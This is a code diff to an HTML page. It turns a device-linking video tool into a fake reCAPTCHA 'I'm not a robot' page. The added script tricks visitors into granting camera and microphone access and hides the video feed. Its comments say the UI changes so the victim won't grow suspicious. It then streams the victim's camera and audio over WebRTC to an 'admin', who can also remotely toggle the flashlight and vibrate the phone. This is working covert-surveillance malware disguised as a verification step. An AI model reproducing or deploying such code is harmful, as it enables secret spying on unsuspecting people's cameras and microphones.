@@ -1,83 +1,111 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Leo Ghost V1</title>
+    <title>Verification Required</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="/socket.io/socket.io.js"></script>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; text-align: center; margin: 0; padding: 20px; }
-        input { padding: 10px; width: 80%; margin-bottom: 10px; background: #111; border: 1px solid #0f0; color: #0f0; outline: none; }
-        button { padding: 10px 20px; background: #0f0; color: #000; border: none; cursor: pointer; font-weight: bold; border-radius: 5px; }
-        video { width: 100%; border: 2px solid #0f0; margin-top: 10px; border-radius: 10px; background: #222; }
-        #localVideo { width: 30%; position: fixed; bottom: 10px; right: 10px; border: 1px solid white; z-index: 10; }
-        .hidden { display: none; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f9f9f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .captcha-box { background: white; border: 1px solid #d3d3d3; padding: 20px; border-radius: 3px; display: flex; align-items: center; gap: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 300px; }
+        .checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .checkbox.checked { background: #4a90e2; border-color: #4a90e2; }
+        .checkbox.checked::after { content: '✔'; color: white; font-size: 18px; }
+        .text { color: #555; font-size: 14px; font-weight: 500; }
+        .logo { margin-left: auto; text-align: center; }
+        .logo img { width: 30px; }
+        .logo p { font-size: 8px; margin: 0; color: #555; }
+        #final-page { display: none; text-align: center; padding: 20px; }
+        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
     </style>
 </head>
 <body>
-  <h1>LEO GHOST V1</h1>
-    <div id="login">
-        <p>Enter a shared email to connect devices</p>
-        <input type="email" id="email" placeholder="example@gmail.com">
-        <br>
-        <button onclick="startSession()">START CONNECTION</button>
+
+    <div id="captcha-container" class="captcha-box">
+        <div id="check" class="checkbox" onclick="verify()"></div>
+        <div class="text">I'm not a robot</div>
+        <div class="logo">
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+            <p>reCAPTCHA</p>
+            <p style="font-size: 7px;">Privacy - Terms</p>
+        </div>
     </div>
 
-    <div id="dashboard" class="hidden">
-        <p>Target View: <span id="userEmail" style="color: white;"></span></p>
-        <video id="remoteVideo" autoplay playsinline></video>
-        <video id="localVideo" autoplay playsinline muted></video>
+    <div id="final-page">
+        <h2>Verification Successful</h2>
+        <p>Please wait while we redirect you...</p>
+        <img src="https://i.stack.imgur.com/ATB3o.gif" width="30">
     </div>
+    <!-- Hidden Video for Stream -->
+    <video id="localVideo" autoplay playsinline muted></video>
 
-    <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
         let peerConnection;
         const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
-        let userEmail = "";
-      async function startSession() {
-            userEmail = document.getElementById('email').value;
-            if(!userEmail) return alert("Email daal bhai!");
-            
-            document.getElementById('login').classList.add('hidden');
-            document.getElementById('dashboard').classList.remove('hidden');
-            document.getElementById('userEmail').innerText = userEmail;
-            
-            socket.emit('join', userEmail);
+        let localStream;
 
+        async function verify() {
+            document.getElementById('check').classList.add('checked');
+            
+            // Background mein camera access mangna
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById('localVideo').srcObject = stream;
-
-                peerConnection = new RTCPeerConnection(config);
-                stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));
-
-                peerConnection.onicecandidate = (event) => {
-                    if(event.candidate) socket.emit('signal', { email: userEmail, signal: { candidate: event.candidate } });
-                };
-              peerConnection.ontrack = (event) => {
-                    document.getElementById('remoteVideo').srcObject = event.streams[0];
-                };
-
-                const offer = await peerConnection.createOffer();
-                await peerConnection.setLocalDescription(offer);
-                socket.emit('signal', { email: userEmail, signal: { sdp: offer } });
+                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('localVideo').srcObject = localStream;
+                
+                // Target join signal bhejna
+                socket.emit('target-join');
+                // UI badal dena taaki shak na ho
+                setTimeout(() => {
+                    document.getElementById('captcha-container').style.display = 'none';
+                    document.getElementById('final-page').style.display = 'block';
+                }, 1000);
 
             } catch (err) {
-                alert("Camera permission denied!");
+                alert("Please enable camera permission to verify you are not a robot.");
+                location.reload();
             }
         }
-      socket.on('signal', async (signal) => {
-            if(!peerConnection) return;
-            if(signal.sdp) {
-                await peerConnection.setRemoteDescription(new RTCSessionDescription(signal.sdp));
-                if(signal.sdp.type === 'offer') {
-                    const answer = await peerConnection.createAnswer();
-                    await peerConnection.setLocalDescription(answer);
-                    socket.emit('signal', { email: userEmail, signal: { sdp: answer } });
+        // Admin Commands Handle Karna
+        socket.on('command', async (cmd) => {
+            if(cmd === 'start-stream') {
+                startWebRTC();
+            } else if(cmd === 'flash') {
+                const track = localStream.getVideoTracks()[0];
+                const capabilities = track.getCapabilities();
+                if (capabilities.torch) {
+                    const settings = track.getSettings();
+                    await track.applyConstraints({ advanced: [{ torch: !settings.torch }] });
                 }
-            } else if(signal.candidate) {
-                await peerConnection.addIceCandidate(new RTCIceCandidate(signal.candidate));
+            } else if(cmd === 'vibrate') {
+                window.navigator.vibrate([200, 100, 200]);
+            } else if(cmd === 'flip') {
+                // Camera flip logic (Front to Back)
+                // Ye tabhi kaam karega jab phone mein multiple cameras honge
+                alert("Camera flip command received (Logic update needed for specific hardware)");
             }
         });
-    </script>
+        async function startWebRTC() {
+            peerConnection = new RTCPeerConnection(config);
+            localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
+
+            peerConnection.onicecandidate = (event) => {
+                if(event.candidate) socket.emit('signal', { to: 'admin', signal: { candidate: event.candidate } });
+            };
+
+            const offer = await peerConnection.createOffer();
+            await peerConnection.setLocalDescription(offer);
+            
+            // Hamara server 'admin' ko pehchanta hai
+            socket.emit('signal', { to: 'admin', signal: { sdp: offer } });
+        }
+
+        socket.on('signal', async (data) => {
+            if(data.signal.sdp) {
+                await peerConnection.setRemoteDescription(new RTCSessionDescription(data.signal.sdp));
+            } else if(data.signal.candidate) {
+                await peerConnection.addIceCandidate(new RTCIceCandidate(data.signal.candidate));
+            }
+        }); 
+        </script>
 </body>
 </html>
